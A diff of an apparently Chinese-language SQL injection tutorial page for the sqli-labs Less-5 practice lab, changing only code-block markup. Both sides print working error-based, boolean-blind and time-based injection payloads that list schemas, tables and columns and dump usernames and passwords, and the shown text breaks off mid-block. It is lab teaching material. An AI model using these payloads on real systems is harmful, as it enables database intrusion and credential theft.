@@ -322,112 +322,42 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <li>
 <p>updatexml()</p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- -
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e),3)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#34;security&#34;),0x7e,version(),0x7e),3)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;user&#34;),0x7e,version(),0x7e),3)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e),3)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p>extractvalue()</p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e))-- -
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e,version(),0x7e))-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#34;security&#34;),0x7e,version(),0x7e))-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;user&#34;),0x7e,version(),0x7e))-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;:&#39;, username, password) from users limit 0, 1),0x7e,version(),0x7e))-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
@@ -435,60 +365,23 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <p>主键重复</p>
 <p>?id=1&rsquo; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a&ndash;+
 爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- - #Subquery returns more than 1 row
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#34;security&#34;),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#34;user&#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&#34;user&#34; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and (select 1 from (select count(*),concat((select concat_ws(&#39;:&#39;, username, password) from users limit 0, 1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 </ul>
@@ -501,252 +394,91 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <li>
 <p><code>left()</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and left(database(), 1)&lt;&#39;s&#39;-- -
 </span></span><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and left((select schema_name from information_schema.schemata limit 0,1), 1)&lt;&#39;s&#39;-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and left((select table_name from information_schema.tables where  table_schema = &#34;security&#34; limit 0,1), 1)&lt;&#39;a&#39;-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and left((select column_name from information_schema.columns where  table_name = &#34;users&#34; limit 0,1), 1)&lt;&#39;a&#39;-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and left((select username from users limit 0,1), 1)&lt;&#39;z&#39;-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p><code>substr()</code> &amp; <code>ascii()</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) &lt; 80-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0, 1),1,1)) &lt; 80-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0, 1),1,1)) &gt; 80-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select username from users limit 0, 1),1,1)) &lt; 50-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p><code>regexp</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.schemata where schema_name regexp &#39;^security&#39; limit 0,1)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.tables where table_schema = &#34;security&#34; and table_name regexp &#39;^users&#39; limit 1,1)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and column_name regexp &#39;^username&#39; limit 0,1)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and 1=(select 1 from users where username regexp &#39;^dumb&#39; limit 1,1)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p><code>like</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and ((select schema_name from information_schema.schemata limit 0,1) like &#39;i%&#39;)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and ((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1) like &#39;x%&#39;)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and ((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1) like &#39;id%&#39;)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and ((select username from users limit 0,1) like &#39;dumb%&#39;)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p><code>ORD()</code> and <code>MID()</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select schema_name from information_schema.schemata limit 0,1),1,1))&lt;68-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1),1,1))&gt;68-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1),1,1))&lt;68-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))&gt;68-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 </ul>
@@ -760,236 +492,76 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <li>
 <p><code>sleep()</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),sleep(5),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1), 1, 1))=101),sleep(5),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1), 1, 1))=105),sleep(5),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
